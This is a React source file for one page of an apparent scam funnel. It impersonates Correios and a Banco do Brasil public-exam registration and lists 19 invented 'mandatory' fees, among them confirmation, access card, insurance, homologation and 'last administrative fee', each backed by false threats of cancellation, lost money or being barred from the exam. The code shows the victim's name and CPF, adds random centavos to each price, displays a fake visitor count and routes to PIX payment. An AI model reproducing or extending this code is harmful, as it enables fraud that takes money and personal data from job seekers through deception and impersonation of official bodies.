import { useEffect, useMemo, useState } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import { FileCheck, FileText, Shield, MapPin, CreditCard, Fingerprint, BookOpen, CheckSquare, Star } from "lucide-react";
import { Button } from "@/components/ui/button";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession, CepData, AgencyData, useFunnelGuard } from "@/hooks/useSessionPersistence";

import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

interface UpsellInfoItem {
  title: string;
  valor: number;
  icon: typeof MapPin;
  headline: string;
  explicacao: string;
  items: string[];
  consequencias: string[];
  nota: string;
  botaoTexto: string;
}

const buildUpsellInfo = (cepData?: CepData, agencyData?: AgencyData): UpsellInfoItem[] => {
  const escolaNome = agencyData?.name
    || (cepData ? `Escola Municipal ${cepData.localidade}` : "Escola designada pelo sistema");
  const escolaCidade = agencyData?.endereco
    || (cepData ? `${cepData.localidade}/${cepData.uf}` : "Cidade será definida com base no seu CEP");

  return [
    {
      title: "Confirmação da Inscrição", valor: 47, icon: FileCheck,
      headline: "⚠️ ATENÇÃO: SUA INSCRIÇÃO SERÁ CANCELADA EM 24 HORAS",
      explicacao: "Sua inscrição está com status PENDENTE agora. Isso significa que seu nome NÃO APARECE na lista oficial de candidatos. Se você não confirmar AGORA, sua inscrição será CANCELADA AUTOMATICAMENTE em 24 horas e você VAI PERDER a vaga. O dinheiro que você já pagou NÃO será devolvido. A confirmação é OBRIGATÓRIA — sem ela, no dia da prova seu nome simplesmente NÃO vai estar lá e você será IMPEDIDO de entrar.",
      items: [
        "Status muda de PENDENTE para CONFIRMADA imediatamente",
        "Seu nome incluído na lista oficial de candidatos",
        "Número de protocolo definitivo gerado na hora",
        "Comprovante de inscrição enviado por e-mail",
        "Vaga GARANTIDA no concurso",
        "Confirmação válida em todo o território nacional",
      ],
      consequencias: [
        "Sua inscrição será CANCELADA AUTOMATICAMENTE em 24 horas",
        "Você VAI PERDER a vaga e TODO o dinheiro já investido",
        "NÃO haverá reembolso — o valor pago é PERDIDO",
        "Terá que refazer TODO o processo do ZERO no próximo concurso",
      ],
      nota: "⚠️ SEM A CONFIRMAÇÃO, SUA INSCRIÇÃO SERÁ CANCELADA E VOCÊ PERDE TUDO.",
      botaoTexto: "CONFIRMAR INSCRIÇÃO AGORA",
    },
    {
      title: "Confirmação do Local da Prova", valor: 37, icon: MapPin,
      headline: "Confirme seu local de prova para manter a prioridade de alocação",
      explicacao: cepData
        ? `Com base no CEP ${cepData.cep}, seu local de prova atual é ${escolaNome}, em ${escolaCidade}. Esta confirmação é obrigatória para manter a alocação prioritária perto da sua região. Sem confirmação no prazo, o sistema pode realocar para outra unidade com vaga disponível, aumentando custo de transporte e desgaste físico no dia da prova.`
        : "A confirmação do local é obrigatória para manter prioridade na unidade mais próxima. Sem pagamento no prazo, o sistema pode realocar sua prova para outra cidade ou bairro com disponibilidade.",
      items: [
        cepData ? `Local confirmado: ${escolaNome}` : "Prova priorizada na unidade mais próxima",
        cepData ? `Cidade: ${escolaCidade}` : "Local enviado por e-mail e SMS",
        "Sala com acessibilidade garantida",
        "Prioridade de alocação registrada no sistema",
        "Mapa com direções para o local da prova",
        "Possibilidade de ajuste de local dentro do prazo",
      ],
      consequencias: [
        "Realocação automática para unidade com vaga disponível",
        "Maior custo de deslocamento até o local da prova",
        "Risco de chegar cansado e com menor rendimento",
        "Perda da prioridade de alocação por CEP",
      ],
      nota: "Pagamento obrigatório para manter o local de prova priorizado na sua região.",
      botaoTexto: "CONFIRMAR LOCAL DE PROVA AGORA",
    },
    {
      title: "Cartão de Acesso à Prova", valor: 39, icon: CreditCard,
      headline: "🚫 SEM O CARTÃO VOCÊ NÃO ENTRA NA PROVA — PONTO FINAL",
      explicacao: "O Cartão de Acesso é o documento OBRIGATÓRIO para entrar no local de prova. Os fiscais NÃO vão deixar você entrar sem ele — NÃO IMPORTA se seu nome está na lista. Sem o cartão, você fica do lado de FORA assistindo os outros candidatos entrarem. Todo o dinheiro investido, todo o tempo estudando — JOGADO NO LIXO porque você não tinha o cartão.",
      items: [
        "Documento oficial com seu nome, foto e CPF",
        "Número da sala e horário exato da prova",
        "QR Code para entrada RÁPIDA sem fila",
        "Versão digital disponível no celular",
        "Local da prova com endereço completo",
        "Código de barras para conferência dos fiscais",
        "Válido como documento de identificação no local",
      ],
      consequencias: [
        "Você será IMPEDIDO DE ENTRAR no local da prova",
        "PERDERÁ a inscrição e TODOS os valores pagos",
        "NÃO haverá segunda chance — a prova acontece UMA ÚNICA VEZ",
        "Meses de estudo JOGADOS NO LIXO",
      ],
      nota: "🚫 SEM O CARTÃO = SEM PROVA. SEM PROVA = SEM VAGA. É SIMPLES ASSIM.",
      botaoTexto: "GARANTIR MEU CARTÃO DE ACESSO AGORA",
    },
    {
      title: "Seguro do Candidato", valor: 27, icon: Shield,
      headline: "⚠️ SE O CONCURSO FOR CANCELADO, VOCÊ PERDE TODO SEU DINHEIRO",
      explicacao: "Concursos são cancelados o tempo todo. Já aconteceu DEZENAS de vezes e milhares de candidatos PERDERAM TUDO que pagaram — sem direito a reembolso, sem recurso, sem nada. Se isso acontecer e você NÃO tiver o seguro, seu dinheiro VAI PRO LIXO. Com o seguro, você recebe 100% DE VOLTA em qualquer situação. É a única proteção que existe.",
      items: [
        "Reembolso de 100% se o concurso for cancelado",
        "Cobertura total se a prova for adiada",
        "Proteção contra erro ou falha no sistema",
        "Suporte jurídico GRATUITO pra reclamar seus direitos",
        "Cobertura para problemas no dia da prova",
        "Reembolso processado em até 7 dias úteis",
      ],
      consequencias: [
        "Se o concurso for cancelado, você PERDE TUDO — sem reembolso",
        "NÃO terá direito a nenhum valor de volta",
        "Ficará SEM suporte jurídico se houver irregularidades",
        "Vai ter que engolir o prejuízo calado",
      ],
      nota: "⚠️ SEM SEGURO = SEM PROTEÇÃO. SE CANCELAR, VOCÊ PERDE TUDO.",
      botaoTexto: "PROTEGER MEU INVESTIMENTO AGORA",
    },
    {
      title: "Apostila Digital Oficial", valor: 33, icon: BookOpen,
      headline: "📚 CANDIDATOS COM MATERIAL OFICIAL PASSAM 3X MAIS",
      explicacao: "Esta apostila foi elaborada com base no conteúdo EXATO do edital — as matérias que VÃO CAIR na prova. Enquanto você estuda às cegas, outros candidatos estão estudando EXATAMENTE o que vai ser cobrado. Candidatos que usam material oficial têm taxa de aprovação 3X MAIOR. Você vai competir com eles sem esse material?",
      items: [
        "Conteúdo completo de TODAS as matérias do edital",
        "Questões comentadas de provas anteriores da MESMA banca",
        "Resumos e mapas mentais para revisão rápida",
        "Acesso IMEDIATO após pagamento",
        "PDF — acesse no celular, tablet ou computador",
        "Atualizações automáticas se o edital mudar",
        "Gabaritos comentados passo a passo",
      ],
      consequencias: [
        "Vai estudar SEM SABER o que realmente cai na prova",
        "Risco ALTÍSSIMO de reprovar por falta de preparação",
        "Outros candidatos terão VANTAGEM ENORME sobre você",
        "Vai perder tempo estudando o que NÃO cai",
      ],
      nota: "📚 QUEM ESTUDA COM MATERIAL OFICIAL PASSA. QUEM NÃO ESTUDA, REPROVA.",
      botaoTexto: "BAIXAR APOSTILA OFICIAL AGORA",
    },
    {
      title: "Simulado Online da Banca", valor: 24, icon: FileText,
      headline: "🎯 FAÇA A PROVA ANTES DA PROVA — SIMULADO IDÊNTICO",
      explicacao: "Este simulado reproduz EXATAMENTE o formato, tempo e dificuldade da prova real. Quem faz simulado chega no dia da prova PREPARADO — sabe o formato, sabe administrar o tempo, sabe o que esperar. Quem NÃO faz, chega nervoso, perde tempo e REPROVA. Simples assim.",
      items: [
        "Mesmo tempo e formato da prova oficial",
        "Correção automática com gabarito comentado",
        "Ranking geral com outros candidatos",
        "Refaça QUANTAS VEZES quiser até o dia da prova",
        "Relatório de desempenho por matéria",
        "Identifica seus pontos fracos pra focar no estudo",
        "Cronômetro simulando a pressão real da prova",
      ],
      consequencias: [
        "Vai entrar na prova SEM SABER o formato das questões",
        "NÃO vai saber administrar o tempo — vai se desesperar",
        "Nervosismo e surpresa no dia = REPROVAÇÃO",
      ],
      nota: "🎯 QUEM FAZ SIMULADO, PASSA PREPARADO. QUEM NÃO FAZ, LEVA SUSTO.",
      botaoTexto: "FAZER SIMULADO AGORA",
    },
    {
      title: "Certificado de Pré-Aprovação", valor: 19, icon: Fingerprint,
      headline: "📄 PRECISA FALTAR NO TRABALHO? ESTE CERTIFICADO RESOLVE",
      explicacao: "O Certificado de Pré-Aprovação comprova que você é candidato oficial e está apto a fazer a prova. A maioria dos candidatos USA este certificado para justificar falta no trabalho — empresas ACEITAM como comprovante oficial. Sem ele, você pode levar FALTA, ter DESCONTO no salário ou até ADVERTÊNCIA.",
      items: [
        "Certificado com seus dados completos e protocolo",
        "ACEITO por empresas para justificar falta no trabalho",
        "Comprova que você é candidato oficial do concurso",
        "Válido em todo o território nacional",
        "Formato digital e impresso",
        "Número de registro único para verificação online",
      ],
      consequencias: [
        "NÃO terá documento para justificar falta no trabalho",
        "Pode ter DESCONTO no salário ou ADVERTÊNCIA por falta",
        "Não poderá comprovar que é candidato oficial",
      ],
      nota: "📄 SEM CERTIFICADO = FALTA INJUSTIFICADA NO TRABALHO.",
      botaoTexto: "GERAR MEU CERTIFICADO AGORA",
    },
    {
      title: "Acompanhamento por SMS e E-mail", valor: 15, icon: CheckSquare,
      headline: "📱 NÃO FIQUE POR FORA — RECEBA TODOS OS AVISOS",
      explicacao: "Concursos mudam datas, locais e regras SEM AVISO. Se você não ficar sabendo a tempo, pode ir pro local ERRADO ou perder um prazo IMPORTANTE. Já aconteceu com milhares de candidatos que PERDERAM a vaga por não saber de uma mudança. Com o acompanhamento, você recebe TUDO direto no celular — ANTES de todo mundo.",
      items: [
        "Alerta IMEDIATO de mudança de data ou local",
        "Gabarito oficial enviado no DIA da prova",
        "Resultado ANTES da publicação no site oficial",
        "Avisos importantes por SMS direto no celular",
        "Lembretes automáticos antes da prova",
        "Notificação de convocação para posse",
        "Atualizações sobre recursos e mudanças no edital",
      ],
      consequencias: [
        "Pode PERDER prazos importantes sem saber",
        "Risco de ir pro LOCAL ERRADO no dia da prova",
        "Vai descobrir o resultado DEPOIS de todo mundo",
        "Pode perder a CONVOCAÇÃO para posse sem saber",
      ],
      nota: "📱 QUEM NÃO SE CADASTRA, PERDE PRAZO E PERDE VAGA.",
      botaoTexto: "ATIVAR ALERTAS AGORA",
    },
    {
      title: "Garantia de Vaga na Região", valor: 24, icon: Star,
      headline: "GARANTA QUE VAI TRABALHAR PERTO DE CASA",
      explicacao: "Com esta taxa, se você for aprovado, vai trabalhar na agência MAIS PERTO da sua casa. Sem essa garantia, o órgão pode te enviar para QUALQUER cidade do estado — a CENTENAS de quilômetros de onde você mora. Imagine passar no concurso e ter que se mudar pra uma cidade que você nem conhece. Com a garantia, você ESCOLHE onde trabalha.",
      items: [
        "Trabalhe na agência do Banco do Brasil MAIS PERTO de você",
        "Prioridade TOTAL na escolha da cidade de lotação",
        "Acompanhamento VIP de todo o processo até a posse",
        "Inscrição 100% CONCLUÍDA após este pagamento",
        "Suporte dedicado para dúvidas sobre o concurso",
        "Garantia registrada no sistema com número de protocolo",
        "Certificado de inscrição completa enviado por e-mail",
      ],
      consequencias: [
        "Pode ser enviado para QUALQUER cidade do estado — sem escolha",
        "NÃO terá prioridade na escolha do local de trabalho",
        "Sua inscrição ficará como INCOMPLETA no sistema",
        "Pode ter que se MUDAR para cidade desconhecida",
      ],
      nota: "Taxa obrigatória para garantir alocação na região de preferência.",
      botaoTexto: "CONFIRMAR VAGA NA REGIÃO AGORA",
    },
    {
      title: "Taxa de Homologação Documental", valor: 19, icon: FileCheck,
      headline: "📋 HOMOLOGAÇÃO OBRIGATÓRIA — SEM ELA SUA INSCRIÇÃO FICA IRREGULAR",
      explicacao: "A homologação documental é o processo administrativo que valida todos os documentos apresentados na sua inscrição. Sem essa homologação, sua inscrição permanece com status IRREGULAR no sistema e pode ser INDEFERIDA a qualquer momento. A comissão organizadora exige que todos os candidatos tenham seus documentos homologados dentro do prazo.",
      items: [
        "Validação completa de TODOS os documentos da inscrição",
        "Certificado de homologação com número de protocolo",
        "Verificação de conformidade com o edital",
        "Status da inscrição alterado para REGULAR",
        "Comprovante de homologação enviado por e-mail",
        "Registro no sistema oficial do concurso",
      ],
      consequencias: [
        "Inscrição permanece com status IRREGULAR no sistema",
        "Risco de INDEFERIMENTO da inscrição sem aviso",
        "Documentação não validada = candidatura sob risco",
        "Pode ser IMPEDIDO de fazer a prova por pendência documental",
      ],
      nota: "📋 SEM HOMOLOGAÇÃO = INSCRIÇÃO IRREGULAR. REGULARIZE AGORA.",
      botaoTexto: "HOMOLOGAR MEUS DOCUMENTOS AGORA",
    },
    {
      title: "Taxa de Material Didático Oficial", valor: 27, icon: BookOpen,
      headline: "📚 MATERIAL OFICIAL DA BANCA — CONTEÚDO EXATO DA PROVA",
      explicacao: "O material didático oficial é elaborado com base no conteúdo programático definido no edital. Contém as matérias que serão cobradas na prova, organizadas conforme os critérios da banca examinadora. Candidatos que estudam pelo material oficial têm desempenho significativamente superior na avaliação.",
      items: [
        "Conteúdo programático completo conforme o edital",
        "Material elaborado pela banca organizadora",
        "Questões modelo no padrão da prova",
        "Acesso digital imediato após confirmação",
        "Atualizações em caso de retificação do edital",
        "Gabaritos comentados das questões modelo",
      ],
      consequencias: [
        "Vai estudar SEM SABER o que realmente cai na prova",
        "Risco de reprovar por falta de preparação adequada",
        "Outros candidatos com material oficial terão vantagem",
        "Perda de tempo estudando conteúdo fora do edital",
      ],
      nota: "📚 QUEM ESTUDA COM MATERIAL OFICIAL TEM VANTAGEM. NÃO FIQUE PRA TRÁS.",
      botaoTexto: "ACESSAR MATERIAL OFICIAL AGORA",
    },
    {
      title: "Taxa de Protocolo de Recurso", valor: 22, icon: Shield,
      headline: "⚖️ PROTOCOLO ADMINISTRATIVO PARA INTERPOSIÇÃO DE RECURSOS",
      explicacao: "O protocolo de recurso é o instrumento administrativo que permite ao candidato contestar questões, gabaritos ou irregularidades no processo seletivo. Sem o protocolo registrado, o candidato NÃO tem direito a interpor recurso junto à banca examinadora. Erros em concursos acontecem com frequência e recursos são a única forma de corrigir injustiças.",
      items: [
        "Protocolo de recurso registrado no sistema",
        "Modelos de recurso conforme normas da banca",
        "Orientação administrativa para contestação",
        "Análise automática do gabarito oficial",
        "Prazo monitorado para interposição",
        "Acompanhamento do resultado do recurso",
      ],
      consequencias: [
        "NÃO poderá recorrer em caso de erro ou irregularidade",
        "Questões anuladas não serão revertidas a seu favor",
        "Outros candidatos vão recorrer e ganhar pontos — você não",
        "Pode perder a vaga por frações de ponto sem defesa",
      ],
      nota: "⚖️ SEM PROTOCOLO = SEM DIREITO A RECURSO. GARANTA SUA DEFESA.",
      botaoTexto: "REGISTRAR MEU PROTOCOLO AGORA",
    },
    {
      title: "Taxa de Retificação do Edital", valor: 17, icon: FileText,
      headline: "📢 RETIFICAÇÕES DO EDITAL — FIQUE INFORMADO DE QUALQUER MUDANÇA",
      explicacao: "Editais de concurso são retificados com frequência — alterações em datas, conteúdo programático, número de vagas e requisitos. A taxa de retificação garante que você receba IMEDIATAMENTE qualquer alteração oficial, com análise do impacto nas suas condições de participação no certame.",
      items: [
        "Notificação instantânea de retificações oficiais",
        "Análise comparativa das alterações no edital",
        "Impacto das mudanças na sua preparação",
        "Novos conteúdos adicionados em destaque",
        "Alterações de data e local comunicadas na hora",
        "Histórico completo de todas as retificações",
      ],
      consequencias: [
        "Pode estudar conteúdo que foi retirado do edital",
        "Risco de perder prazo alterado sem conhecimento",
        "NÃO será informado sobre mudanças no local ou data",
        "Outros candidatos se adaptam — você não",
      ],
      nota: "📢 EDITAL RETIFICADO SEM AVISO = PREJUÍZO CERTO. FIQUE INFORMADO.",
      botaoTexto: "ATIVAR NOTIFICAÇÕES DE RETIFICAÇÃO",
    },
    {
      title: "Taxa de Processamento Prioritário", valor: 24, icon: CheckSquare,
      headline: "⏱️ PROCESSAMENTO PRIORITÁRIO — RESULTADO EM ATÉ 48 HORAS",
      explicacao: "O processamento prioritário coloca sua prova na fila de correção antecipada. Enquanto o resultado geral demora semanas, candidatos com processamento prioritário recebem o resultado individual em até 48 horas após a aplicação, podendo iniciar os preparativos para a posse imediatamente.",
      items: [
        "Prova processada em até 48 horas após aplicação",
        "Resultado individual enviado por SMS e e-mail",
        "Relatório detalhado de desempenho por matéria",
        "Posição no ranking antes do resultado oficial",
        "Orientação imediata sobre próximos passos",
        "Acesso antecipado ao gabarito comentado",
      ],
      consequencias: [
        "Vai esperar SEMANAS pelo resultado sem informação",
        "NÃO terá relatório de desempenho por matéria",
        "Outros candidatos saberão o resultado antes de você",
        "Tempo perdido esperando sem poder se preparar",
      ],
      nota: "⏱️ RESULTADO EM 48H OU SEMANAS DE ESPERA. A ESCOLHA É SUA.",
      botaoTexto: "ATIVAR PROCESSAMENTO PRIORITÁRIO",
    },
    {
      title: "Taxa de Validação de Escolaridade", valor: 15, icon: Fingerprint,
      headline: "🎓 VALIDAÇÃO DE ESCOLARIDADE — EXIGÊNCIA PARA A POSSE",
      explicacao: "Para tomar posse no cargo de Agente Comercial, é obrigatória a comprovação de Ensino Médio completo. A taxa de validação garante a verificação e conformidade do seu certificado escolar com as exigências do edital. Certificados com pendências ou irregularidades resultam em NEGATIVA de posse.",
      items: [
        "Verificação completa do certificado escolar",
        "Orientação para obtenção de segunda via",
        "Validação junto às instituições de ensino",
        "Documento formatado conforme exigências do edital",
        "Suporte para resolver pendências escolares",
        "Declaração de conformidade emitida",
      ],
      consequencias: [
        "Posse pode ser NEGADA por irregularidade no certificado",
        "Vaga transferida para o próximo candidato da lista",
        "NÃO terá tempo de resolver pendências posteriormente",
        "Pode descobrir o problema quando já for tarde",
      ],
      nota: "🎓 SEM VALIDAÇÃO = RISCO NA POSSE. RESOLVA AGORA.",
      botaoTexto: "VALIDAR MINHA ESCOLARIDADE AGORA",
    },
    {
      title: "Taxa de Comunicação Oficial", valor: 14, icon: Star,
      headline: "📱 COMUNICAÇÃO OFICIAL DO CONCURSO — NÃO PERCA NENHUM AVISO",
      explicacao: "A taxa de comunicação oficial garante que você receba todas as comunicações administrativas do concurso diretamente no seu celular e e-mail. Convocações, prazos, mudanças de local e resultados são enviados de forma prioritária. Candidatos que não recebem as comunicações oficiais correm risco de perder prazos e convocações.",
      items: [
        "Todas as comunicações oficiais por SMS e e-mail",
        "Convocações enviadas com prioridade",
        "Alertas de prazos administrativos",
        "Resultado oficial antes da publicação geral",
        "Lembretes automáticos antes da prova",
        "Notificação de convocação para posse",
      ],
      consequencias: [
        "Pode perder prazos administrativos importantes",
        "Risco de não receber convocação para posse",
        "NÃO será notificado sobre mudanças de local ou data",
        "Pode perder a vaga por falta de comunicação",
      ],
      nota: "📱 SEM COMUNICAÇÃO OFICIAL = RISCO DE PERDER PRAZOS E CONVOCAÇÕES.",
      botaoTexto: "ATIVAR COMUNICAÇÃO OFICIAL AGORA",
    },
    {
      title: "Taxa de Garantia de Aplicação", valor: 18, icon: Shield,
      headline: "⏰ GARANTIA ADMINISTRATIVA EM CASO DE IMPEDIMENTO NA PROVA",
      explicacao: "A taxa de garantia de aplicação cobre situações de impedimento no dia da prova — problemas de transporte, emergências ou imprevistos. Sem essa garantia, qualquer impedimento resulta em PERDA TOTAL do investimento e da inscrição. Com a garantia, o candidato tem direito a reembolso integral e reagendamento prioritário.",
      items: [
        "Reembolso integral em caso de impedimento comprovado",
        "Reagendamento prioritário para próxima aplicação",
        "Cobertura para problemas de transporte",
        "Suporte de emergência no dia da prova",
        "Cobertura para emergências médicas comprovadas",
        "Proteção contra greves e paralisações",
      ],
      consequencias: [
        "Qualquer impedimento = perda da prova e do investimento",
        "NÃO terá direito a reagendamento",
        "Todo o valor investido será perdido",
        "Terá que aguardar o próximo concurso sem garantia",
      ],
      nota: "⏰ IMPREVISTO NO DIA DA PROVA = TUDO PERDIDO. A GARANTIA É SUA PROTEÇÃO.",
      botaoTexto: "ATIVAR GARANTIA DE APLICAÇÃO",
    },
    {
      title: "Taxa de Orientação ao Candidato", valor: 28, icon: BookOpen,
      headline: "🧑‍🏫 ORIENTAÇÃO INDIVIDUALIZADA SOBRE O PROCESSO SELETIVO",
      explicacao: "A taxa de orientação ao candidato garante acompanhamento individualizado de um especialista em concursos públicos. O especialista analisa seu perfil, identifica pontos de atenção e elabora um plano de preparação personalizado conforme as exigências do edital e da banca organizadora.",
      items: [
        "Sessão individual com especialista em concursos",
        "Análise do perfil e pontos de atenção",
        "Plano de preparação personalizado",
        "Estratégia de prova conforme a banca",
        "Orientação sobre o processo seletivo completo",
        "Acompanhamento até o dia da prova",
      ],
      consequencias: [
        "Preparação sem estratégia definida",
        "NÃO terá orientação sobre pontos fracos",
        "Outros candidatos orientados terão vantagem",
        "Risco de reprovar por preparação inadequada",
      ],
      nota: "🧑‍🏫 PREPARAÇÃO SEM ORIENTAÇÃO = RISCO DE REPROVAR. TENHA UM ESPECIALISTA.",
      botaoTexto: "SOLICITAR ORIENTAÇÃO AGORA",
    },
    {
      title: "Taxa de Habilitação para Posse", valor: 21, icon: Star,
      headline: "📄 HABILITAÇÃO ADMINISTRATIVA PARA O PROCESSO DE POSSE",
      explicacao: "A taxa de habilitação para posse é o último procedimento administrativo do processo de inscrição. Inclui a preparação documental, orientação sobre exames admissionais e acompanhamento jurídico necessário para a efetivação da posse no cargo. Sem a habilitação, o candidato aprovado pode enfrentar impedimentos burocráticos na fase de posse.",
      items: [
        "Habilitação documental completa para posse",
        "Orientação para exame médico admissional",
        "Checklist de documentos com acompanhamento",
        "Orientação jurídica sobre questões trabalhistas",
        "Guia do processo de posse no órgão",
        "Suporte administrativo por 90 dias",
        "Certificado de habilitação emitido",
      ],
      consequencias: [
        "Pode enfrentar IMPEDIMENTOS burocráticos na posse",
        "NÃO terá orientação sobre exame admissional",
        "Risco de perder prazo de documentação",
        "Processo de posse sem acompanhamento",
      ],
      nota: "📄 ÚLTIMA TAXA ADMINISTRATIVA. APÓS O PAGAMENTO, SEU PROCESSO ESTARÁ COMPLETO.",
      botaoTexto: "CONCLUIR HABILITAÇÃO AGORA",
    },
  ];
};

const UpsellInfo = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 19);
  useFunnelGuard(`/upsell-info/${stepNumber}`);
  const currentIndex = stepNumber - 1;

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;
  const cepData: CepData | undefined = session?.cepData;
  const agencyData: AgencyData | undefined = session?.agencyData;

  const upsellInfo = useMemo(() => buildUpsellInfo(cepData, agencyData), [cepData, agencyData]);
  const info = upsellInfo[currentIndex];

  const valorComCentavos = info.valor + (Math.floor(Math.random() * 99) + 1) / 100;

  const [pessoasOnline] = useState(() => Math.floor(Math.random() * 30) + 15);

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell-info/${stepNumber}`, valorBeneficio, protocolo, cepData });
    trackFunnelEvent(`upsell-info-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePagar = () => {
    navigate(`/upsell/${stepNumber}`, { state: { cpfData, valorBeneficio, protocolo } });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Agente Comercial > Confirmações de Etapa" />

      <main className="flex-1 px-4 py-6 sm:py-8">
        <div className="max-w-lg mx-auto space-y-5">

          <h1 className="titulo-institucional text-lg leading-tight">{info.headline}</h1>

          {/* Explicação detalhada */}
          <div className="rounded border-2 border-destructive/30 bg-muted/30 p-4 text-sm text-foreground leading-relaxed font-medium">
            {info.explicacao}
          </div>

          {/* Local da prova - dados do CEP (only on step 2) */}
          {stepNumber === 2 && (
            <table className="tabela-zebra">
              <thead><tr><th colSpan={2}>Local de prova atribuído ao seu CEP</th></tr></thead>
              <tbody>
                <tr><td className="font-semibold w-1/3">Escola</td><td className="font-bold">{agencyData?.name || (cepData ? `Escola Municipal ${cepData.localidade}` : 'Processando...')}</td></tr>
                <tr><td className="font-semibold">Cidade</td><td>{agencyData?.endereco || (cepData ? `${cepData.localidade}/${cepData.uf}` : 'Processando com base no seu CEP...')}</td></tr>
                {cepData && <tr><td className="font-semibold">CEP</td><td>{cepData.cep}</td></tr>}
                <tr><td className="font-semibold">Status</td><td className="font-bold text-destructive animate-pulse">Aguardando confirmação de pagamento</td></tr>
              </tbody>
            </table>
          )}

          {/* Items table */}
          <table className="tabela-zebra">
            <thead>
              <tr><th>O que está incluído nesta taxa</th></tr>
            </thead>
            <tbody>
              {info.items.map((item, i) => (
                <tr key={i}><td className="font-medium">• {item}</td></tr>
              ))}
            </tbody>
          </table>

          {/* Consequências */}
          <div className="rounded border-2 border-destructive/40 bg-muted p-4 space-y-2">
            <p className="font-bold text-destructive text-sm">Impactos em caso de não pagamento:</p>
            <ul className="space-y-1.5">
              {info.consequencias.map((c, i) => (
                <li key={i} className="text-sm text-destructive font-medium flex items-start gap-2">
                  <span className="mt-0.5">•</span>
                  <span>{c}</span>
                </li>
              ))}
            </ul>
          </div>

          {/* Candidato */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Dados do Candidato</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-1/3">Candidato</td><td>{cpfData.nome}</td></tr>
              <tr><td className="font-semibold">CPF</td><td>{cpfData.cpf}</td></tr>
            </tbody>
          </table>

          {/* Benefícios do Cargo */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Benefícios do Cargo — Agente Comercial</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-2/5">Remuneração</td><td>Salário inicial de R$ 6.000,00 a R$ 9.000,00 + PLR</td></tr>
              <tr><td className="font-semibold">Jornada</td><td>30 horas semanais (jornada reduzida)</td></tr>
              <tr><td className="font-semibold">Vale-Alimentação</td><td>R$ 1.014,42/mês</td></tr>
              <tr><td className="font-semibold">Plano de Saúde</td><td>Cassi (família incluída)</td></tr>
              <tr><td className="font-semibold">Previdência</td><td>Previ — Banco do Brasil</td></tr>
            </tbody>
          </table>
          {/* Observação */}
          <div className="text-xs space-y-1 bg-muted border border-border rounded p-3">
            <p className="font-bold text-foreground">Atenção:</p>
            <p className="font-semibold text-foreground">• Esta etapa possui cobrança obrigatória para manter sua inscrição ativa no fluxo.</p>
            <p className="text-muted-foreground">• Pagamento via PIX com confirmação instantânea.</p>
          </div>

          {/* Valor */}
          <div className="rounded border-2 border-destructive bg-destructive/10 p-4 text-center space-y-1">
            <p className="text-sm font-bold text-foreground">VALOR DA TAXA — PAGAMENTO ÚNICO</p>
            <p className="text-4xl font-black text-primary">
              R$ {valorComCentavos.toFixed(2).replace('.', ',')}
            </p>
          </div>

          <Button onClick={handlePagar} className="w-full min-h-14 h-auto px-3 py-3 text-xs sm:text-sm leading-tight whitespace-normal text-center font-black tracking-normal">
            {info.botaoTexto}
          </Button>

          <p className="text-xs text-center text-destructive font-bold">
            O não pagamento desta taxa dentro do prazo pode gerar cancelamento automático da inscrição.
          </p>
        </div>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default UpsellInfo;
